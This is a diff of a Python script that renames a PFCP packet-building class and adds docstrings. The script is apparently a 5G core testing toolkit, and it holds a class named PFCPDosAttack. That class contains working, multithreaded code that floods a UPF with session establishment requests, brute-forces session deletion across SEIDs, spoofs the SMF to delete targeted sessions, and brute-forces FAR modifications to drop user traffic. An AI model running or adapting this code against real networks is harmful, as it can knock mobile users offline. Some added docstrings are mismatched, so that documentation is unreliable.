@@ -112,8 +112,38 @@ class HandleParams:
 
 
 
- 
-class Ez_PFCP:
+# PFCP Request Builder
+# PFCP Session Manager
+# PFCP Toolkit
+
+class PFCPToolkit:
+    """
+    PFCPToolkit is a utility class to build, send, and manage PFCP messages for 5G core network testing.
+
+    This class simplifies the creation and transmission of PFCP Association Setup, 
+    Session Establishment, Modification, and Deletion requests. It provides functionalities 
+    to randomize identifiers (SEID, TEID, Sequence numbers) and manage PFCP sessions programmatically.
+
+    Main Features:
+        - Build and send PFCP Association Setup Requests
+        - Build and send PFCP Session Establishment Requests (with optional random FAR generation)
+        - Build and send PFCP Session Modification Requests (targeting FARs)
+        - Build and send PFCP Session Deletion Requests
+        - Support for verbose logging, turbo sending mode, and Ethernet layer (sendp)
+
+    Attributes:
+        src_addr (str): Source IP address for PFCP messages.
+        dest_addr (str): Destination IP address (UPF or peer).
+        src_port (int): Source UDP port (default 8805).
+        dest_port (int): Destination UDP port (default 8805).
+        verbose (bool): Enables detailed logging output if True.
+        classPrefix (str): Prefix used for internal logging tags.
+        logger (Log): Logger instance for structured outputs.
+        paramsHandler (HandleParams): Helper for parameter validation.
+        seq (int): Sequence number for PFCP messages, auto-incremented.
+        seid (int, optional): Default SEID for session management (can be overridden).
+    """
+
     def __init__(self, src_addr=None, dest_addr=None, src_port=8805, dest_port=8805, verbose=False):
         self.src_addr = src_addr
         self.dest_addr = dest_addr
@@ -134,48 +164,22 @@ class Ez_PFCP:
 
     # Utility functions 
     
-    def check_parameters(self, src_addr, dest_addr, src_port, dest_port, seid=None, require_seid=True):        
-        ret_val = True
-        
-        self.paramsHandler.check_parameters({
-            "src_addr": src_addr,
-            "dest_addr": dest_addr,
-            "src_port": src_port,
-            "dest_port": dest_port,
-            "seid": 1 if not require_seid else seid,
-            
-        })
-        
-        if src_addr is None:
-            self.logger.error("Error: No source address provided. Expected a valid IPv4 address (e.g., '192.168.1.1').")
-            ret_val = False
-        
-        if dest_addr is None:
-            self.logger.error("Error: No destination address provided. Expected a valid IPv4 address (e.g., '192.168.1.2').")
-            ret_val = False
-            
-        if src_port is None:
-            self.logger.error("Error: No source port provided. Expected a valid port number (e.g., 8805).")
-            ret_val = False
-            
-        if dest_port is None:
-            self.logger.error("Error: No destination port provided. Expected a valid port number (e.g., 8805).")
-            ret_val = False
-        
-        if require_seid and seid is None:
-            self.logger.error("Error: No SEID provided. Expected a valid SEID (e.g., 0xC0FFEE).")
-            ret_val = False
-        
-        if ret_val == False:
-            self.logger.error("Error: Invalid parameters provided")
-        
-        return ret_val
         
             
             
     
         
     def new_seq(self, randomize=False):
+        """
+        Generate a new sequence number for PFCP messages.
+
+        Args:
+            randomize (bool, optional): Randomizes the sequence number. Defaults to False.
+
+        Returns:
+            integer: The generated sequence number.
+        """
+        
         if randomize:
             seqNbr = random.randint(1, 0xFFFFFFFF)
             return seqNbr
@@ -189,6 +193,12 @@ class Ez_PFCP:
     # FAR Operations
 
     def Random_create_far(self):
+        """
+        Create a random FAR (Forwarding Action Rule) for PFCP messages.
+
+        Returns:
+            IE_CreateFAR: The created FAR packet.
+        """
         return IE_CreateFAR(
             IE_list=[
                 IE_FAR_Id(id=random.randint(1, 255)),
@@ -203,6 +213,16 @@ class Ez_PFCP:
         )
         
     def Update_FAR(far_id, apply_action_ie=IE_ApplyAction(FORW=1)):
+        """
+        Create a raw Update FAR (Forwarding Action Rule) Information Element for PFCP messages.
+
+        Args:
+            far_id (int): The FAR ID to update within the PFCP session.
+            apply_action_ie (IE_ApplyAction, optional): The Apply Action IE specifying the new behavior. Defaults to IE_ApplyAction(FORW=1).
+
+        Returns:
+            Raw: Raw bytes representing the Update FAR IE, ready to be included in a PFCP message.
+        """
 
         ie_update_far = IE_UpdateFAR(
         IE_list=[
@@ -217,6 +237,19 @@ class Ez_PFCP:
     # PFCP Message Building Functions
     
     def Build_PFCP_association_setup_req(self, src_addr=None, dest_addr=None, src_port=None, dest_port=None):
+        """
+        Build a PFCP Association Setup Request packet.
+
+        Args:
+            src_addr (str, optional): Source IPv4 address of the PFCP initiator. Defaults to instance's src_addr.
+            dest_addr (str, optional): Destination IPv4 address of the PFCP peer (e.g., UPF). Defaults to instance's dest_addr.
+            src_port (int, optional): Source UDP port for the PFCP message. Defaults to instance's src_port.
+            dest_port (int, optional): Destination UDP port for the PFCP message. Defaults to instance's dest_port.
+
+        Returns:
+            scapy.packet.Packet: The constructed PFCP Association Setup Request packet ready to send.
+        """
+
         src_addr = src_addr or self.src_addr
         dest_addr = dest_addr or self.dest_addr
         src_port = src_port or self.src_port
@@ -255,6 +288,26 @@ class Ez_PFCP:
     
     def Build_PFCP_session_establishment_req(self, src_addr=None, dest_addr=None, src_port=None, dest_port=None,
                                             seid=0x1, ue_addr=None, teid=0x11111111, precedence=255, interface=1, random_seq=False, random_far_number=0):
+        """
+        Build a PFCP Session Establishment Request packet.
+
+        Args:
+            src_addr (str, optional): Source IPv4 address of the PFCP message sender. Defaults to instance's src_addr.
+            dest_addr (str, optional): Destination IPv4 address (usually the UPF). Defaults to instance's dest_addr.
+            src_port (int, optional): UDP source port for sending the PFCP message. Defaults to instance's src_port.
+            dest_port (int, optional): UDP destination port for receiving the PFCP message. Defaults to instance's dest_port.
+            seid (int, optional): Session Endpoint Identifier to assign to the session. Defaults to 0x1.
+            ue_addr (str, optional): IPv4 address of the User Equipment (UE) to be associated with the PDR. Defaults to None.
+            teid (int, optional): Tunnel Endpoint Identifier for GTP-U encapsulation. Defaults to 0x11111111.
+            precedence (int, optional): Priority value assigned to the PDR (lower values have higher priority). Defaults to 255.
+            interface (int, optional): Source interface type for the packet detection (e.g., 1 = Access). Defaults to 1.
+            random_seq (bool, optional): If True, randomizes the PFCP sequence number. Defaults to False.
+            random_far_number (int, optional): Number of additional randomly generated FARs to append. Defaults to 0.
+
+        Returns:
+            scapy.packet.Packet: The constructed PFCP Session Establishment Request packet ready for transmission.
+        """
+
         src_addr = src_addr or self.src_addr
         dest_addr = dest_addr or self.dest_addr
         src_port = src_port or self.src_port
@@ -321,6 +374,25 @@ class Ez_PFCP:
 
 
     def Build_PFCP_session_deletion_req(self, seid=None, src_addr=None, dest_addr=None, src_port=None, dest_port=None, random_seq=False):
+        """
+        Build a PFCP Session Establishment Request packet.
+
+        Args:
+            src_addr (str, optional): Source IP address for the PFCP message. Defaults to instance's src_addr.
+            dest_addr (str, optional): Destination IP address (typically the UPF). Defaults to instance's dest_addr.
+            src_port (int, optional): Source UDP port for the PFCP message. Defaults to instance's src_port.
+            dest_port (int, optional): Destination UDP port for the PFCP message. Defaults to instance's dest_port.
+            seid (int, optional): Session Endpoint Identifier (SEID) for the session. Defaults to 0x1.
+            ue_addr (str, optional): User Equipment IP address (UE IP). Defaults to None.
+            teid (int, optional): Tunnel Endpoint Identifier for GTP-U encapsulation. Defaults to 0x11111111.
+            precedence (int, optional): Priority level for the PDR. Defaults to 255.
+            interface (int, optional): Source interface type (1 = Access). Defaults to 1.
+            random_seq (bool, optional): Randomize the PFCP message sequence number if True. Defaults to False.
+            random_far_number (int, optional): Number of additional FARs to randomly create and append. Defaults to 0.
+
+        Returns:
+            scapy.packet.Packet: The constructed PFCP Session Establishment Request packet ready to send.
+        """
 
         seid = seid or self.seid
         src_addr = src_addr or self.src_addr
@@ -356,6 +428,23 @@ class Ez_PFCP:
     
     
     def Build_PFCP_session_modification_req(self, seid, far_id, update_ie=None, src_addr=None, dest_addr=None, src_port=None, dest_port=None):
+        """
+        Build a PFCP Session Modification Request packet.
+
+        Args:
+            seid (int): Session Endpoint Identifier (SEID) of the session to modify.
+            far_id (int): Forwarding Action Rule (FAR) ID to update.
+            update_ie (scapy.packet.Packet, optional): Pre-built Update FAR Information Element to include. 
+                If None, a default Update FAR is generated using the provided FAR ID. Defaults to None.
+            src_addr (str, optional): Source IPv4 address for the PFCP message. Defaults to instance's src_addr.
+            dest_addr (str, optional): Destination IPv4 address (typically the UPF). Defaults to instance's dest_addr.
+            src_port (int, optional): UDP source port for sending the PFCP message. Defaults to instance's src_port.
+            dest_port (int, optional): UDP destination port for the PFCP message. Defaults to instance's dest_port.
+
+        Returns:
+            scapy.packet.Packet: The constructed PFCP Session Modification Request packet ready for transmission.
+        """
+
         src_addr = src_addr or self.src_addr
         dest_addr = dest_addr or self.dest_addr
         src_port = src_port or self.src_port
@@ -374,8 +463,7 @@ class Ez_PFCP:
         }, "[Build_PFCP_session_modification_req]"):
             return 
         
-        if(not self.check_parameters(src_addr, dest_addr, src_port, dest_port, seid)):
-            return
+
         
        
         update_ie = update_ie or self.Update_FAR(far_id)
@@ -397,6 +485,19 @@ class Ez_PFCP:
 
 
     def Send_PFCP_association_setup_req(self, src_addr=None, dest_addr=None, src_port=None, dest_port=None):
+        """
+        Send a PFCP Association Setup Request to a PFCP peer (typically a UPF).
+
+        Args:
+            src_addr (str, optional): Source IPv4 address for the PFCP message. Defaults to instance's src_addr.
+            dest_addr (str, optional): Destination IPv4 address (UPF). Defaults to instance's dest_addr.
+            src_port (int, optional): UDP source port. Defaults to instance's src_port.
+            dest_port (int, optional): UDP destination port. Defaults to instance's dest_port.
+
+        Returns:
+            None
+        """
+
         src_addr = src_addr or self.src_addr
         dest_addr = dest_addr or self.dest_addr
         src_port = src_port or self.src_port
@@ -427,7 +528,28 @@ class Ez_PFCP:
             
             
     def Send_PFCP_session_establishment_req(self, src_addr=None, dest_addr=None, src_port=None, dest_port=None,
-                                            seid=0x1, ue_addr=None, teid=0x11111111, precedence=255, interface=1, random_seq=False, random_far_number=0, net_interface="eth0", use_sendp=False):
+                                            seid=0x1, ue_addr=None, teid=0x11111111, precedence=255, interface=1, random_seq=False, random_far_number=0, use_sendp=False):
+        """
+        Send a PFCP Session Establishment Request to a PFCP peer.
+
+        Args:
+            src_addr (str, optional): Source IPv4 address for the PFCP message. Defaults to instance's src_addr.
+            dest_addr (str, optional): Destination IPv4 address (UPF). Defaults to instance's dest_addr.
+            src_port (int, optional): UDP source port. Defaults to instance's src_port.
+            dest_port (int, optional): UDP destination port. Defaults to instance's dest_port.
+            seid (int, optional): Session Endpoint Identifier (SEID) for the session. Defaults to 0x1.
+            ue_addr (str, optional): IPv4 address of the User Equipment (UE). Defaults to None.
+            teid (int, optional): Tunnel Endpoint Identifier for GTP-U encapsulation. Defaults to 0x11111111.
+            precedence (int, optional): Priority value for the PDR. Defaults to 255.
+            interface (int, optional): Source interface type for the PDR (e.g., 1 = Access). Defaults to 1.
+            random_seq (bool, optional): If True, randomizes the PFCP sequence number. Defaults to False.
+            random_far_number (int, optional): Number of additional random FARs to include. Defaults to 0.
+            use_sendp (bool, optional): If True, sends using Layer 2 (sendp with Ethernet). Defaults to False.
+
+        Returns:
+            None
+        """
+
         src_addr = src_addr or self.src_addr
         dest_addr = dest_addr or self.dest_addr
         src_port = src_port or self.src_port
@@ -475,7 +597,22 @@ class Ez_PFCP:
             
 
     def Send_PFCP_session_deletion_req(self, seid, src_addr=None, dest_addr=None, src_port=None, dest_port=None, turbo=False, random_seq=False):
-        
+        """
+        Send a PFCP Session Deletion Request to a PFCP peer (typically a UPF).
+
+        Args:
+            seid (int): Session Endpoint Identifier (SEID) of the session to delete.
+            src_addr (str, optional): Source IPv4 address for the PFCP message. Defaults to instance's src_addr.
+            dest_addr (str, optional): Destination IPv4 address (typically the UPF). Defaults to instance's dest_addr.
+            src_port (int, optional): UDP source port for sending the PFCP message. Defaults to instance's src_port.
+            dest_port (int, optional): UDP destination port for the PFCP message. Defaults to instance's dest_port.
+            turbo (bool, optional): If True, send the packet without waiting for a response (fire-and-forget mode). Defaults to False.
+            random_seq (bool, optional): If True, randomize the sequence number in the PFCP message. Defaults to False.
+
+        Returns:
+            int or None: PFCP Cause IE value received in response if available, otherwise None.
+        """
+
         
         src_addr = src_addr or self.src_addr
         dest_addr = dest_addr or self.dest_addr
@@ -541,6 +678,26 @@ class Ez_PFCP:
 
 
 class PFCPDosAttack:
+    """
+    Performs PFCP-based Denial of Service (DoS) attacks against a target UPF.
+
+    This class provides functionalities to automate the sending of PFCP session establishment, 
+    deletion, and modification requests in order to flood or brute-force a 5G core network component (UPF).
+
+    Attributes:
+        evil_addr (str): Source IP address used to send PFCP messages (attacker IP).
+        upf_addr (str): Destination IP address of the target UPF.
+        src_port (int): UDP source port for PFCP messages.
+        dest_port (int): UDP destination port for PFCP messages (default PFCP port 8805).
+        interface (str): Network interface used for sending packets (e.g., "eth0").
+        ue_base_addr (IPv4Address): Starting IP address for generating UE IP addresses.
+        verbose (bool): Enable verbose logging.
+        prepare (bool): Prepare packets in memory before sending to improve speed.
+        randomize (bool): Enable randomization of sequence numbers, TEID, SEID, UE addresses.
+        random_far_number (int): Number of random FARs to attach to session establishment.
+        smf_addr (str, optional): Address of the SMF for targeted deletion attacks.
+    """
+
     def __init__(self, evil_addr, upf_addr, src_port, dest_port, interface="eth0", ue_start_addr="1.1.1.1", verbose=False, prepare=False, randomize=False, random_far_number=15, smf_addr=None):
         self.evil_addr = evil_addr
         self.upf_addr = upf_addr
@@ -574,6 +731,16 @@ class PFCPDosAttack:
         
         
     def set_interface(self, interface):
+        """
+        Set the network interface used to send PFCP packets.
+
+        Args:
+            interface (str): Name of the network interface (e.g., "eth0", "ens33").
+
+        Returns:
+            None
+        """
+
         self.interface = interface
         if not self.verbose : return
         if interface:
@@ -583,6 +750,16 @@ class PFCPDosAttack:
 
         
     def set_random_far_number(self, random_far_number=15):
+        """
+        Set the number of random FARs to be generated for each PFCP session establishment.
+
+        Args:
+            random_far_number (int): Number of random Forwarding Action Rules to generate. Defaults to 15.
+
+        Returns:
+            None
+        """
+
         
         self.random_far_number = random_far_number
         if not self.verbose : return
@@ -591,6 +768,16 @@ class PFCPDosAttack:
             
 
     def set_randomize(self, randomize=True):
+        """
+        Enable or disable randomization mode for SEID, TEID, UE IP addresses, and sequence numbers.
+
+        Args:
+            randomize (bool, optional): True to enable randomization, False to disable. Defaults to True.
+
+        Returns:
+            None
+        """
+
         self.randomize = randomize
         if not self.verbose : return
         if randomize:
@@ -601,6 +788,16 @@ class PFCPDosAttack:
             
     
     def set_prepare(self, prepare=True):
+        """
+        Enable or disable preparation mode for PFCP session establishment packets.
+
+        Args:
+            prepare (bool, optional): True to enable preparation of packets before sending. Defaults to True.
+
+        Returns:
+            None
+        """
+
         self.prepare = prepare
         if not self.verbose : return
         if prepare:
@@ -611,6 +808,16 @@ class PFCPDosAttack:
             
     
     def set_verbose(self, verbose=True):
+        """
+        Enable or disable verbose mode for logging.
+
+        Args:
+            verbose (bool, optional): True to enable detailed logs, False to disable. Defaults to True.
+
+        Returns:
+            None
+        """
+
         self.verbose = verbose
         if verbose:
             self.logger.info("Verbose mode enabled")
@@ -620,6 +827,17 @@ class PFCPDosAttack:
             
     
     def new_ue_addr(self, randomize=False):
+        """
+        Generate a new UE (User Equipment) IPv4 address.
+
+        Args:
+            randomize (bool, optional): If True, generates a completely random IP address. 
+                If False, increments from the base UE IP address. Defaults to False.
+
+        Returns:
+            str: The generated UE IPv4 address as a string.
+        """
+
         if self.randomize or randomize:
             return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
 
@@ -628,6 +846,17 @@ class PFCPDosAttack:
         return str(next_ip)
     
     def new_seq(self, randomize=False):
+        """
+        Generate a new PFCP sequence number.
+
+        Args:
+            randomize (bool, optional): If True, generates a completely random sequence number. 
+                If False, increments sequentially with thread safety. Defaults to False.
+
+        Returns:
+            int: The generated sequence number.
+        """
+
         if self.randomize or randomize:
             seqNbr = random.randint(1, 0xFFFFFFFF)
             return seqNbr
@@ -640,6 +869,17 @@ class PFCPDosAttack:
             return seq
     
     def new_seid(self, randomize=False):
+        """
+        Generate a new SEID (Session Endpoint Identifier).
+
+        Args:
+            randomize (bool, optional): If True, generates a completely random SEID. 
+                If False, increments sequentially. Defaults to False.
+
+        Returns:
+            int: The generated SEID.
+        """
+
         if self.randomize or randomize:
             self.seid = random.randint(1, 0xFFFFFFFFFFFFFFFF)
             return self.seid
@@ -651,6 +891,17 @@ class PFCPDosAttack:
         return seid
     
     def new_teid(self, randomize=False):
+        """
+        Generate a new TEID (Tunnel Endpoint Identifier).
+
+        Args:
+            randomize (bool, optional): If True, generates a completely random TEID. 
+                If False, increments sequentially. Defaults to False.
+
+        Returns:
+            int: The generated TEID.
+        """
+
         if self.randomize or randomize:
             self.teid = random.randint(1, 0xFFFFFFFF)
             return self.teid
@@ -663,10 +914,41 @@ class PFCPDosAttack:
     
 
     
-    def prepare_pfcp_session_establishment_flood(self, count):
+    def prepare_pfcp_session_establishment_flood(self, count, evil_addr=None, upf_addr=None, src_port=None, dest_port=None):
+        """
+        Prepare a list of PFCP Session Establishment Request packets for flooding.
+
+        This method builds and stores multiple PFCP Session Establishment packets 
+        in memory to optimize later flooding operations.
+
+        Args:
+            count (int): Number of PFCP Session Establishment packets to generate.
+            evil_addr (str, optional): Source IPv4 address for the PFCP packets. Defaults to instance's evil_addr.
+            upf_addr (str, optional): Destination IPv4 address (UPF) for the PFCP packets. Defaults to instance's upf_addr.
+            src_port (int, optional): UDP source port. Defaults to instance's src_port.
+            dest_port (int, optional): UDP destination port. Defaults to instance's dest_port.
+
+        Returns:
+            None
+        """
+
+        evil_addr = evil_addr or self.evil_addr
+        upf_addr = upf_addr or self.upf_addr
+        src_port = src_port or self.src_port
+        dest_port = dest_port or self.dest_port
+        if not self.paramsHandler.check_parameters({
+            "evil_addr": evil_addr,
+            "upf_addr": upf_addr,
+            "src_port": src_port,
+            "dest_port": dest_port,
+            
+        }, "[prepare_pfcp_session_establishment_flood]"):
+            return
+        
+        
         self.logger.info(f"Preparing {count} PFCP session establishment packets")
         
-        pfcp_obj = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port, verbose=True)
+        pfcp_obj = PFCPToolkit(evil_addr, upf_addr, src_port, dest_port, verbose=self.verbose)
         
         start_time = time.time()
         last_update = start_time
@@ -690,13 +972,28 @@ class PFCPDosAttack:
         self.logger.success(f"Prepared {count} PFCP session establishment packets")
 
     
-    def prepare_pfcp_session_deletion_flood(self, count):
+    def prepare_pfcp_session_deletion_flood(self, count, evil_addr=None, upf_addr=None, src_port=None, dest_port=None):
         if self.verbose:
             self.logger.info(f"Preparing {count} PFCP session deletion packets")
 
         print("Hello World")
     
     def pfcp_session_establishment_flood_worker(self, count, start_index=0):
+        """
+        Worker function to send PFCP Session Establishment Requests.
+
+        If prepare mode is enabled, sends pre-built packets from memory.
+        Otherwise, dynamically builds and sends new PFCP Session Establishment packets.
+
+        Args:
+            count (int): Number of PFCP requests to send.
+            start_index (int, optional): Starting index in the prepared packet list if in prepare mode. Defaults to 0.
+
+        Returns:
+            None
+        """
+
+        
         worker_logger = Log(f"[DoS][Worker-{start_index}]")
         if self.verbose:
             if self.prepare:
@@ -716,7 +1013,7 @@ class PFCPDosAttack:
                     worker_logger.error(f"Error sending PFCP session establishment packet: {e}")
                     
         else:
-            pfcp_obj = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port)
+            pfcp_obj = PFCPToolkit(self.evil_addr, self.upf_addr, self.src_port, self.dest_port)
             for i in range(count):
                 try:
                     pfcp_obj.Send_PFCP_session_establishment_req(
@@ -738,13 +1035,27 @@ class PFCPDosAttack:
             
 
     def pfcp_session_deletion_bruteforce_worker(self, count, start_index=0):
+        """
+        Worker function to brute-force PFCP Session Deletion Requests.
+
+        Sends PFCP Session Deletion Requests across a range of SEIDs,
+        attempting to find valid active sessions.
+
+        Args:
+            count (int): Number of SEIDs to try.
+            start_index (int, optional): Starting SEID offset. Defaults to 0.
+
+        Returns:
+            None
+        """
+
         worker_logger = Log(f"[DoS][Worker-{start_index}]")
         if self.verbose:
             worker_logger.info(f"Worker starts flooding with {count} requests (offset {start_index})")
             
         
         
-        pfcp_obj = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port)
+        pfcp_obj = PFCPToolkit(self.evil_addr, self.upf_addr, self.src_port, self.dest_port)
         for i in range(start_index, start_index+count): 
             try:
 
@@ -762,6 +1073,20 @@ class PFCPDosAttack:
                 
     
     def Start_pfcp_session_deletion_bruteforce(self, reqNbr=100, num_threads=1):
+        """
+        Launch a multithreaded brute-force attack by sending PFCP Session Deletion Requests.
+
+        Divides the total number of requests across multiple threads 
+        and attempts to discover active sessions based on SEID responses.
+
+        Args:
+            reqNbr (int, optional): Total number of PFCP deletion requests to send. Defaults to 100.
+            num_threads (int, optional): Number of threads to use for concurrent sending. Defaults to 1.
+
+        Returns:
+            None
+        """
+
 
         if self.verbose:
             self.logger.info(f"Starting PFCP session deletion bruteforce with {reqNbr} requests and {num_threads} threads")
@@ -770,7 +1095,7 @@ class PFCPDosAttack:
         threads= []
         per_thread = reqNbr // num_threads
         remaining = reqNbr % num_threads
-        pfcp_obj = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port, verbose=self.verbose)
+        pfcp_obj = PFCPToolkit(self.evil_addr, self.upf_addr, self.src_port, self.dest_port, verbose=self.verbose)
         thread_offset = 0
         start_time = time.time()
         for i in range(num_threads):
@@ -794,6 +1119,20 @@ class PFCPDosAttack:
         
     
     def Start_pfcp_session_establishment_flood(self, reqNbr=100, num_threads=1):
+        """
+        Launch a multithreaded PFCP Session Establishment flood attack.
+
+        Optionally prepares the PFCP session establishment packets in advance,
+        then sends them over multiple threads to maximize throughput.
+
+        Args:
+            reqNbr (int, optional): Total number of PFCP session establishment requests to send. Defaults to 100.
+            num_threads (int, optional): Number of concurrent threads to use for sending. Defaults to 1.
+
+        Returns:
+            None
+        """
+
         if self.prepare:
             self.prepare_pfcp_session_establishment_flood(reqNbr)
         
@@ -806,7 +1145,7 @@ class PFCPDosAttack:
         per_thread = reqNbr // num_threads
         remaining = reqNbr % num_threads
 
-        pfcp_obj = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port, verbose=True)
+        pfcp_obj = PFCPToolkit(self.evil_addr, self.upf_addr, self.src_port, self.dest_port, verbose=True)
         pfcp_association_packet = pfcp_obj.Build_PFCP_association_setup_req()
         
         start_time = time.time()
@@ -839,7 +1178,23 @@ class PFCPDosAttack:
         
     
     def Start_pfcp_session_deletion_targeted(self, target_seid, smf_addr=None, upf_addr=None, src_port=None, dest_port=None):
-        
+        """
+        Send a targeted PFCP Session Deletion Request to a specific UPF.
+
+        Constructs and sends a deletion request for a specified SEID,
+        optionally overriding the source (SMF) and destination (UPF) addresses and ports.
+
+        Args:
+            target_seid (int): SEID of the session to delete.
+            smf_addr (str, optional): Source IPv4 address (SMF). Defaults to instance's smf_addr.
+            upf_addr (str, optional): Destination IPv4 address (UPF). Defaults to instance's upf_addr.
+            src_port (int, optional): UDP source port. Defaults to instance's src_port.
+            dest_port (int, optional): UDP destination port. Defaults to instance's dest_port.
+
+        Returns:
+            None
+        """
+
         upf_addr = upf_addr or self.upf_addr
         smf_addr = smf_addr or self.smf_addr
         src_port = src_port or self.src_port
@@ -860,18 +1215,36 @@ class PFCPDosAttack:
             self.logger.info(f"Sending PFCP session deletion packet to {upf_addr} with SEID {target_seid}")
             
         
-        ez_pfcp_obj = Ez_PFCP(src_addr=smf_addr,
+        PFCPToolkit_obj = PFCPToolkit(src_addr=smf_addr,
                               dest_addr=upf_addr,
                               src_port=src_port,
                               dest_port=dest_port)
         
-        ez_pfcp_obj.Send_PFCP_session_deletion_req(seid=target_seid)
+        PFCPToolkit_obj.Send_PFCP_session_deletion_req(seid=target_seid)
         
         
         if self.verbose:
             self.logger.success(f"PFCP session deletion packet sent to {upf_addr} with SEID {target_seid}")
     
     def Start_pfcp_session_modification_far_drop_bruteforce(self, far_range, session_range, evil_addr=None, upf_addr=None, src_port=None, dest_port=None):
+        """
+        Launch a brute-force attack by sending PFCP Session Modification Requests targeting FARs.
+
+        Iterates over a range of SEIDs and FAR IDs, attempting to modify forwarding actions
+        and checking for successful responses from the UPF.
+
+        Args:
+            far_range (int): Number of FAR IDs to try for each SEID.
+            session_range (int): Number of SEIDs (sessions) to target.
+            evil_addr (str, optional): Source IPv4 address for the PFCP messages. Defaults to instance's evil_addr.
+            upf_addr (str, optional): Destination IPv4 address (UPF). Defaults to instance's upf_addr.
+            src_port (int, optional): UDP source port. Defaults to instance's src_port.
+            dest_port (int, optional): UDP destination port. Defaults to instance's dest_port.
+
+        Returns:
+            None
+        """
+
         if not self.paramsHandler.check_parameters({
             "far_range": far_range,
             "session_range": session_range,
@@ -883,11 +1256,11 @@ class PFCPDosAttack:
             return
         
         
-        ez_pfcp_obj= Ez_PFCP(src_addr=EVIL_ADDR, dest_addr=UPF_ADDR, src_port=SRC_PORT, dest_port=DEST_PORT)
+        PFCPToolkit_obj= PFCPToolkit(src_addr=EVIL_ADDR, dest_addr=UPF_ADDR, src_port=SRC_PORT, dest_port=DEST_PORT)
         for seid in range(1, session_range):
             
             for farId in range(1, far_range):
-                packet = ez_pfcp_obj.Build_PFCP_session_modification_req(seid=seid, far_id=farId)
+                packet = PFCPToolkit_obj.Build_PFCP_session_modification_req(seid=seid, far_id=farId)
                 res = sr1(packet)
                 pfcp_cause = None
                 for ie in res[PFCP].IE_list:
@@ -903,16 +1276,16 @@ class PFCPDosAttack:
 
 
 
-########## UTILISATION ez_pfcp
+########## UTILISATION PFCPToolkit
 
 # # option 1: (mieux si on veut faire plusieurs requêtes sur le même upf)
-# objet_test = Ez_PFCP(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT, verbose=True)
+# objet_test = PFCPToolkit(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT, verbose=True)
 # objet_test.Send_PFCP_association_setup_req()
 # objet_test.Send_PFCP_session_establishment_req(seid=0xC0FFEE, ue_addr="1.1.1.1")
 
 # # option 2: (plus modulable)
-# Ez_PFCP().Send_PFCP_association_setup_req(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
-# Ez_PFCP().Send_PFCP_session_establishment_req(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT, 
+# PFCPToolkit().Send_PFCP_association_setup_req(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
+# PFCPToolkit().Send_PFCP_session_establishment_req(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT, 
 #                                               seid=0xC0FFEE, ue_addr="1.1.1.1")
 
 
@@ -942,7 +1315,7 @@ class PFCPDosAttack:
 
 def main():
     
-    print("Ez_PFCP and PFCPDosAttack demo script")
+    print("PFCPToolkit and PFCPDosAttack demo script")
     print("Coded with <3 by nxvertime")
     print("---------------------------------------\n")
     
@@ -1041,7 +1414,10 @@ def main():
         
         dos_obj = PFCPDosAttack(evil_addr, upf_addr, src_port, dest_port, verbose=True)
         dos_obj.Start_pfcp_session_modification_far_drop_bruteforce(far_range=far_range, session_range=session_range)
-
+        
 
 if __name__ == "__main__":
     main()
+    
+    
+    
